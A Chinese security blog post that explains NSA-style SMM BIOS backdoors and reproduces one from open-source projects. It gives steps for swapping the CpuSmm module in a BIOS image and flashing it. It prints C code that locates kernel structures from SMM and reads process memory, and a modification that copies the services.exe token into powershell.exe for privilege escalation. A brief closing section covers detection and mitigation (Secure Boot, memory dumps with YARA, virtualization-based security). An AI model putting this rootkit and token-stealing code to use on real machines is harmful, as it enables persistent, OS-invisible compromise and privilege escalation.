#  NSA的"主板Bios后门"原理&复现与检测方案   
原创 为了安全鸭  冲鸭安全   2024-10-20 21:58  
  
## NSA的ANT catalog  
  
ANT目录 是美国国家安全局（NSA）的机密产品目录，其2008-2009年编写的版本于2013年12月由德国新闻杂志《明镜周刊》出版。四十九目录发布了包含间谍设备和间谍软件的图片、图表和说明的页面。这些产品可供定制访问运营部门使用，主要针对苹果、思科和戴尔等美国公司的产品。据信消息来源与爱德华·斯诺登不同，后者对 2010 年代的全球监控信息披露负有主要责任。产品可能受到损害的公司否认与美国国家安全局在开发这些功能方面有任何合作。2014 年，启动了一个项目，将 ANT 目录中的功能实现为开源硬件和软件。其中有个SWAP目录明确指出  
```
"Technology that installs a backdoor software implant on Dell PowerEdge servers via the motherboard BIOS and RAID controller(s)."

```  
  
通过主板 BIOS 和 RAID 控制器在 Dell PowerEdge 服务器上安装后门软件植入的技术。![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Qia6JbYMCKgZ2icp88cXUOtpd0MzQUuXowicDqKFUsacRiajBCXrAdo4T4A/640?wx_fmt=png&from=appmsg "")  
这个是怎么实现的? 让我们一探究竟  
## SMM  
  
SMM是Intel x86体系结构的一种CPU的执行模式。加上SMM，X86 CPU支持四种工作模式。分别是：实模式，保护模式，虚拟8086模式和SMM模式。SMM是一种特殊的工作模式，它不依赖于具体的操作系统，完全由固件来控制。  
  
根据设计，操作系统无法覆盖或禁用 SMI。因此，它是恶意 Rootkit 驻留的目标， 包括 NSA 的“植入物”，它们具有针对特定硬件的单独代码名称，例如 Juniper Networks 防火墙的 SOUFFLETROUGH，SCHOOLMONTANA 适用于同一公司的 J 系列路由器，DEITYBOUNCE 适用于 DELL， 或 IRONCHEF 适用于 HP Proliant 服务器。![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QbA4j4dicHicgRPSYKQHkibFDnkrq1zfsKqUdY1P4VquJtlF8TG1Et9Hog/640?wx_fmt=png&from=appmsg "")  
  
## 实现过程  
### 编写EFI程序  
  
没什么好说,这一步下EDK或者VisualUefi自己编写一下EFI程序,不过我懒得写了,因为开源的挺多的:https://github.com/ekknod/smmhttps://github.com/Oliver-1-1/SmmInfect/tree/mainhttps://github.com/Cr4sh/SmmBackdoorNg  
  
我这边用的是这个,其实大家都大差不差,原理都非常简单:https://github.com/Oliver-1-1/SmmInfect/tree/main  
  
他的这个代码,是标准的efi启动注册Smihandler的代码![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QOVBVficzfquePKSVkWsiciae5zmH2Ggw869CuNAn87CibMgoZCtvvv0H2Q/640?wx_fmt=png&from=appmsg "")  
在SMI回调里面,每有一个SMI请求,就直接读取特定程序的区段![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Qhg6BVIkDcJGTVmZ3tPyeicuCXhgI7gEdjZ6uE7VTg6TXVYgPunon6cw/640?wx_fmt=png&from=appmsg "")  
然后拷贝目标进程的buffer 过去![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QtUdoEA0TIq2lHfwR447ew3XUN3poZehmnvqvpgibJ0X5pibb5ic312y7g/640?wx_fmt=png&from=appmsg "")  
  
粗看了一眼,感觉是非常简单的的代码, 没什么技术难度, 我们直接编译刷到bios里面 (注意这段话,为后面埋下伏笔.后面会考)他这个是EDK写的,直接EDK编译:![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QB9D9cLeB6yfWSw47HDiam0zjenUXhiay7vOIJ72MeLfX400ON07xJtIA/640?wx_fmt=png&from=appmsg "")  
编出来就一个EFI文件:![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Q5OLVdCWaD8YicBiaLrsgTOj5eZ3MlKVsyDgjv8sCbIKIV6diajL5qa3vQ/640?wx_fmt=png&from=appmsg "")  
  
### 刷到bios里面  
  
刷bios的方法非常多, 比如我的X570 PRO,支持m-flash,或者usb flash，如果实在是找不到, 也可以跟我一样买个主板编程器,直接给芯片刷(我买主要是被刷坏了救砖….)首先下载官方的bios:![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QD5iaqeeusl8feSRjNUJsCRK9gYQmLvUdwd0PJYRRUIzzST8xeP169ng/640?wx_fmt=png&from=appmsg "")  
下载完后,用UEFITool打开,我们是SMM层的后门,所以直接搜cpusmm![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QUEbXJKqbaW6Bn1mPcVUibicz8ClZmbyibana84fylh2hX8Ie6ichH2Lylg/640?wx_fmt=png&from=appmsg "")  
这块,直接右键覆盖,选择自己的刚刚编译出来的EFI,然后保存.就行  
  
然后放到U盘里面,重启,进bios,用m-flash刷![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QWqBBicEeun46BXSHflY1diaWcUgQgW5Dh872GMx3mhlIiaVQaFeFrDMVw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Q8RltwV3JQyDcymIY9syuhib0MtjGFJJzB1wXZBic4Fbj7q9aJ0FsEGqA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Q6tGwmDrt9fbxLfuoDiaQSRK9Y7DjxuIATwpMytHCMicqYqkoIQEROAmg/640?wx_fmt=jpeg&from=appmsg "")  
  
启动后,发现很卡,但是后门应用没反应,猜测后门应该是生效了, 卡的原因是每当系统发SMI给主板,主板都要遍历一次物理内存,不卡才怪了,但是后门应用没反应.准备刷回去正常的bios然后改改代码的时候,没想到重启开不了机了…  
### 救砖  
  
主板成砖了,这个是正常的,去JD买了ch341a准备给bios重新刷回去的时候,发现我这高端主板居然有备用应急USB刷ROM的接口…![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QTgsIBoxicEVrPPL30U4hrbvrPDkpCmrBGtR572QBKrZf8RKgeyfdHdA/640?wx_fmt=jpeg&from=appmsg "")  
参考说明,买个U盘,刷成FAT32的分区,然后把最新的ROM放到U盘里面,改名为MSI.ROM![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QImCRuenFwlOZH29r68XVCACnrSSvpWUualD2dj0dcpe1BLHibJLHwnw/640?wx_fmt=png&from=appmsg "")  
重启,按下高贵的usb flash button,指示灯狂闪,说明work了![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QkWG0umB7KhNgAic7Uj5SIjCvY8ITOtSmOWIFVk92Nd1ySKIR1Seiaa6A/640?wx_fmt=png&from=appmsg "")  
五分钟后,正常进入系统了  
## 调试代码  
### 垃圾代码  
  
被搞烂一次的我有点害怕,还是让我们仔细看看代码为什么不生效吧他的主要逻辑是:  
```
1. 寻找系统PML4
2. 通过系统PML4枚举到ntos的镜像
3. 通过NTOS的镜像定位到offset
4. 通过offset读eprocess/读系统虚拟内存,拷贝给R3的程序,实现后门

```  
  
一看不得了,这狗屎代码,确实有点东西![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Qicu5J8VET5jrS7xnLQS3eOLdVmQ1bKsiaHREiawjkkefMQKMSAKB4tuYw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Q7jLqDmh5J8vZHqAwGrPBibSKrPSq3Zk5ncuav9ibZU0XeM7WTRibYBsMg/640?wx_fmt=png&from=appmsg "")  
看到这垃圾代码,庆幸没搞坏我的电脑,写的什么是什么狗屎啊!  
### 调试代码  
  
既然SMI handle生效了,说明剩下的就是读物理内存我也懒得再买个主机然后装串口调试了,为了水一篇文章写这种,有点费钱所以我准备在虚拟机模拟一下,因为原理差不太多.肯定是他读什么内存读错了.  
  
先写个直接读物理内存的驱动加载![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QrMXU99TDias1XVHS6icKrm78plyq05FOs5CsxUPkDYAu7pZEKUfFAfZg/640?wx_fmt=png&from=appmsg "")  
然后用IO通讯,让我们的R3程序能访问物理内存![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QZJhxxRT0D78ZwBuZWD19s4vW9H5SVd7rxkT6eRtzwccOg0sDYN2K1g/640?wx_fmt=png&from=appmsg "")  
测试一下:![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Q7YpDXjDvaoRzA1SJzJ1wP6b6UzEWZMC4bSzcSgbqB0Oc9afg32WxVw/640?wx_fmt=png&from=appmsg "")  
然后把他的代码1:1贴到我的R3代码里面![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3QOmdSb0vWuAa8P8egQ92FpiaZcFCSZSbBV8ibv4yJWicVNwcsia00f3yT8w/640?wx_fmt=png&from=appmsg "")  
就能在虚拟机里面模拟一下SMM被感染的情况了  
### 定位CR3和NTOS BASE  
  
他的代码里面,是通过暴力枚举定位的  
```
STATIC BOOLEAN CheckLow(UINT64* pml4, UINT64* kernel_entry)
{
    UINT64 o = 0;
    while (o < 0x100000)
    {
        o += 0x1000;
        if (IsAddressValid(o) == TRUE) {

            auto tempOffset = ReadPhysical64(o + 0x000);
            if (0x00000001000600E9 != (0xffffffffffff00ff & tempOffset))
            {
                continue;
            }
            tempOffset = ReadPhysical64(o + 0x070);

            if (0xfffff80000000000 != (0xfffff80000000003 & tempOffset))
            {
                continue;
            }
            tempOffset = ReadPhysical64(o + 0x0a0);

            if (0xffffff0000000fff & tempOffset)
            {
                continue;
            }
            *pml4 = ReadPhysical64(o + 0xa0);
            *kernel_entry = ReadPhysical64(o + 0x70);

            return TRUE;
        }

    }
    return FALSE;
}

```  
### 暴力寻找内核模块地址  
  
有CR3后,通过系统CR3暴力枚举ntos的内存(通过暴力枚举PE头)  
```

EFI_STATUS MemGetKernelBase(UINT64* base) {
    if (base == NULL) {
        return EFI_INVALID_PARAMETER;
    }

    UINT64 cr3 = 0;
    UINT64 kernel_entry = 0;
    CheckLow(&cr3, &kernel_entry);

    UINT64 physical_first = 0;
    physical_first =
        TranslateVirtualToPhysical(cr3, kernel_entry & 0xFFFFFFFFFF000000);

    if (IsAddressValid(physical_first) == TRUE && physical_first != 0) {
        if (((kernel_entry & 0xFFFFFFFFFF000000) & 0xfffff) == 0 &&
            ReadPhysical16(physical_first) == 0x5a4d) {
            INT32 kdbg = 0, pool_code = 0;
            for (INT32 u = 0; u < 0x1000; u++) {
                kdbg = kdbg || ReadPhysical64(physical_first + u) ==
                    0x4742444b54494e49;
                pool_code =
                    pool_code ||
                    ReadPhysical64(physical_first + u) == 0x45444f434c4f4f50;
                if (kdbg & pool_code) {
                    *base = kernel_entry & 0xFFFFFFFFFF000000;
                    return EFI_SUCCESS;
                }
            }
        }
    }

    UINT64 physical_sec = 0;
    physical_sec = TranslateVirtualToPhysical(
        cr3, (kernel_entry & 0xFFFFFFFFFF000000) + 0x2000000);

    if (IsAddressValid(physical_sec) == TRUE && physical_sec != 0) {
        if ((((kernel_entry & 0xFFFFFFFFFF000000) + 0x2000000) & 0xfffff) ==
            0 &&
            ReadPhysical16(physical_sec) == 0x5a4d) {
            INT32 kdbg = 0, pool_code = 0;
            for (INT32 u = 0; u < 0x1000; u++) {
                kdbg = kdbg || ReadPhysical64(physical_sec + u) ==
                    0x4742444b54494e49;
                pool_code = pool_code || ReadPhysical64(physical_sec + u) ==
                    0x45444f434c4f4f50;
                if (kdbg & pool_code) {
                    *base = (kernel_entry & 0xFFFFFFFFFF000000) + 0x2000000;
                    return EFI_SUCCESS;
                }
            }
        }
    }

    UINT64 i, p, u, mask = 0xfffff;

    while (mask >= 0xfff) {
        for (i = (kernel_entry & ~0x1fffff) + 0x10000000;
            i > kernel_entry - 0x20000000; i -= 0x200000) {
            for (p = 0; p < 0x200000; p += 0x1000) {
                UINT64 physical_p = 0;
                physical_p = TranslateVirtualToPhysical(cr3, i + p);

                if (IsAddressValid(physical_p) == TRUE && physical_p != 0) {
                    if (((i + p) & mask) == 0 &&
                        ReadPhysical16(physical_p) == 0x5a4d) {
                        INT32 kdbg = 0, poolCode = 0;
                        for (u = 0; u < 0x1000; u++) {
                            if (IsAddressValid(p + u) == FALSE) continue;

                            kdbg = kdbg || ReadPhysical64(physical_p + u) ==
                                0x4742444b54494e49;
                            poolCode =
                                poolCode || ReadPhysical64(physical_p + u) ==
                                0x45444f434c4f4f50;
                            if (kdbg & poolCode) {
                                *base = i + p;
                                return EFI_SUCCESS;
                            }
                        }
                    }
                }
            }
        }

        mask = mask >> 4;
    }
    return EFI_NOT_FOUND;
}

```  
### 解析导出表  
  
有了系统CR3和系统ntos后,就通过导出表定位各种内核偏移(真的非常狗屎这段)  
```
EFI_STATUS SetupWindows() {
    if (SetupDone == TRUE) {
        return EFI_SUCCESS;
    }

    EFI_STATUS status = MemGetKernelCr3(&KernelCr3);
    if (EFI_ERROR(status)) {
        return EFI_NOT_FOUND;
    }

    status = MemGetKernelBase(&KernelBase);
    if (EFI_ERROR(status)) {
        return EFI_NOT_FOUND;
    }

    PsInitialSystemProcess =
        ZGetProcAddressX64(KernelCr3, KernelBase, "PsInitialSystemProcess");
    if (PsInitialSystemProcess == 0) {
        return EFI_NOT_FOUND;
    }

    PsGetProcessSectionBaseAddress =
        ReadVirtual32(ZGetProcAddressX64(KernelCr3, KernelBase,
                                         "PsGetProcessSectionBaseAddress") +
                          3,
                      KernelCr3);
    PsGetProcessExitProcessCalled =
        ReadVirtual32(ZGetProcAddressX64(KernelCr3, KernelBase,
                                         "PsGetProcessExitProcessCalled") +
                          2,
                      KernelCr3);
    PsGetProcessImageFileName = ReadVirtual32(
        ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessImageFileName") +
            3,
        KernelCr3);
    ActiveProcessLinks =
        ReadVirtual32(
            ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessId") + 3,
            KernelCr3) +
        8;
    PsGetProcessPeb = ReadVirtual32(
        ZGetProcAddressX64(KernelCr3, KernelBase, "PsGetProcessPeb") + 3,
        KernelCr3);

    if (!PsInitialSystemProcess || !PsGetProcessExitProcessCalled ||
        !PsGetProcessImageFileName || !ActiveProcessLinks || !PsGetProcessPeb ||
        !PsGetProcessSectionBaseAddress) {
        return EFI_NOT_FOUND;
    }

    SetupDone = TRUE;
    return EFI_SUCCESS;
}

```  
### 后门实现  
  
然后他的代码里面是做通讯,也是通过直接定位程序的eprocess(根据名字)然后读它的区段,然后读区段里面的内容来的R3后门程序:  
```

// Allocate a section so the SMM driver knows what section the communication payload is in.
#pragma section(".ZEPTA", read, write)
__declspec(allocate(".ZEPTA")) volatile SmmCommunicationProtocol protocol;

void TriggerSmi()
{
  BOOLEAN e = false;
  //Get the right privileges to call NtSetSystemEnvironmentValueEx. ( SeSystemEnvironmentPrivilege )
  const NTSTATUS status = RtlAdjustPrivilege(22, true, false, &e);

  if (!NT_SUCCESS(status))
  {
    // We need admin privileges!
    printf("No suitable permission! Open as admin!\n");
    return;
  }

  GUID guid = { 0 };
  // Try to get a variable that doesn't exist so we don't trigger a runtime cache hit
  UNICODE_STRING name = RTL_CONSTANT_STRING(L"ZeptaVar");
  char buffer[8];
  NtSetSystemEnvironmentValueEx(&name, &guid, buffer, sizeof(buffer), EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS);
}
#define  _CRT_SECURE_NO_WARNINGS
void main()
{
  printf("Size of protocol 0x%x\n", (INT)sizeof(SmmCommunicationProtocol)); // 6b
  printf("Address of protocol %llx\n", (ULONG64)&protocol);

  //Read the first 15 bytes of explorer.exe. This will include DOS header if the SMM module is setup correctly.
  strcpy((char*)protocol.process_name, "cmd.exe");
  wcscpy((wchar_t*)protocol.module_name, L"cmd.exe");
  protocol.offset = 0;//= 0x2F000;
  protocol.read_size = 15;
  memset((void*)protocol.read_buffer, 0, sizeof(protocol.read_buffer));

  while (true)
  {

    // Trigger a SMI and the driver will find this process.
    TriggerSmi();
    // Print out the bytes the SMM driver read for us.
    printf("Smi count: %llu\n", protocol.smi_count);

    for (int i = 0; i < protocol.read_size; i++)
    {
      printf("%02X ", protocol.read_buffer[i]);
    }

    Sleep(5000);
  }
}

```  
  
R0后门程序:  
```
    // Get the process we write our communication buffer to
    UINT64 cprocess = GetCommunicationProcess();
    if (cprocess)
    {
        UINT64 base = GetBaseAddressModuleX64(cprocess, (unsigned short*)L"SmiUM.exe");

        if (base)
        {
            UINT64 section = GetSectionBaseAddressX64(cprocess, base, (unsigned char*)".ZEPTA");

            if (section)
            {
                SmmCommunicationProtocol protocol = { 0 };
                ReadVirtual(section + 0b0, GetProcessCr3(cprocess), (UINT8*)&protocol, sizeof(SmmCommunicationProtocol));

                if (protocol.magic != SMM_PROTOCOL_MAGIC)
                {
                    return EFI_SUCCESS;
                }

                UINT64 tprocess = GetEProcess((const char*)protocol.process_name);

                if (tprocess == 0)
                {
                    return EFI_SUCCESS;
                }

                UINT64 tbase = GetBaseAddressModuleX64(tprocess, protocol.module_name);

                if (tbase == 0)
                {
                    return EFI_SUCCESS;
                }
                __debugbreak();

                WriteVirtual(section + SMI_COUNT_OFFSET, GetProcessCr3(cprocess), (UINT8*)&SmiCountIndex, 8);
                //*(UINT64*)(TranslateVirtualToPhysical(GetProcessCr3(cprocess), section + SMI_COUNT_OFFSET)) = SmiCountIndex;

                ReadVirtual(tbase + protocol.offset, GetProcessCr3(tprocess), protocol.read_buffer, protocol.read_size);

                // Section starts at new frame and struct is not bigger then a page size. So we can get away with only translating one time
                //UINT64 temp = TranslateVirtualToPhysical(GetProcessCr3(cprocess), section + READ_BUFFER_OFFSET);
                WriteVirtual(section + READ_BUFFER_OFFSET, GetProcessCr3(cprocess), protocol.read_buffer, protocol.read_size);

                //for (UINT64 i = 0; i < protocol.read_size; i++)
                //{
                //    *(UINT8*)(temp + i) = protocol.read_buffer[i];
                //}
            }
        }
    }
    return EFI_SUCCESS;

```  
  
根据调试结果,我猜测是我把名字改了导致的,之前没看到比较鲁莽的冲了:  
```
UINT64 base = GetBaseAddressModuleX64(cprocess, (unsigned short*)L"SmiUM.exe");

```  
  
在虚拟机里面复现是成功的,能读到cmd.exe的内存:![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Qch091UuegMPYCIc1C124dzj9Q9rPx95fktDHQfxKtILwaPmUokQjyw/640?wx_fmt=png&from=appmsg "")  
但是我也不会刷到bios里面了,这玩意代码太烂,容易出问题。  
### 修改简单一点  
  
这代码太鲁莽了,不适合我们精简的需求,让我们改改,改成一旦有SMI中断,直接把我们的目标进程改成提权.原理非常简单,触发了SMI中断后,我们读services.exe的进程的eprocess->token(在win10 1803是0x358便宜i)然后复制到我们邪恶的提权程序里面  
```
        UINT64 ntBase;
        auto status = MemGetKernelBase(&ntBase);
        printf("KernelCr3: %p ntBase: %p \n", KernelCr3, ntBase);
        SetupWindows();
        auto TargetEvilEprocess = GetEProcess("powershell.exe");
        auto TargetCopyEprocess = GetEProcess("services.exe");

        printf("TargetCopyEprocess: %p TargetEvilEprocess: %p \n", TargetCopyEprocess, TargetEvilEprocess);
        UINT64 copyToken = 0, myToken = 0;
        ReadVirtual(TargetCopyEprocess + 0x358, KernelCr3, (UINT8*)©Token, 8);
        ReadVirtual(TargetEvilEprocess + 0x358, KernelCr3, (UINT8*)&myToken, 8);
        printf("copyToken: %p myToken: %p TargetEvilEprocess: %p \n", copyToken, myToken, TargetEvilEprocess);
        WriteVirtual(TargetEvilEprocess + 0x358, KernelCr3, (UINT8*)©Token, 8);

```  
  
这个非常小巧唯美的后门能帮助我们直接给powershell进行提权,一旦主板刷入了带后门的BIOS,只需要触发SMI就行.测试如下:![](https://mmbiz.qpic.cn/sz_mmbiz_png/ejibWMxI7nWIGicZtJ4IhicmBwoKnSibeg3Qu53icPSpDIyCBCaZZu02vzljSj6ytkFEbt1ODW7yXaIRgnvNEKlVBLQ/640?wx_fmt=png&from=appmsg "")  
当然不止能做这些,我们还能干非常多的事情,就不一一列举  
## 检测与缓解  
  
主板后门攻击难度大,一般人不需要紧张,比如我的主板它是只能进BIOS刷的,也就是说,必须有人在我电脑旁操作才行,那跟人进去了没什么区别有些主板可能是可以系统刷的.  
### 安全启动  
  
开安全启动的意义就是防止此类攻击.建议打开安全启动.开了安全启动这类攻击就无效了  
### dump内存  
  
如果你怀疑被攻击了(一般概率非常非常小),找不到证据,可以dump 0xFF000000 - 0xFFFFFFFF这块内存,这块是bios的硬件内存,SMM后门就存在这段区域里面.具体来说,就只需要在里面暴力枚举头,然后dump出来EFI文件.走yara或者 再人工分析即可.一般这些后门都需要做PML4翻译,特征码非常好写.这里想写个工具检查的,但是想了想估计没几个人bios会中毒,所以算了.  
### 虚拟化安全  
  
打开windows里面的 基于虚拟化的安全,SMM后门就翻译不了地址了.非常安全.  
  
**警告一下大家,别学着我直接刷固件到bios里面,开源项目的几个代码太狂野了,最好是找个测试机来刷,直接刷 小心主板直接报废.刷报废了不要怪我没警告过你**  
  
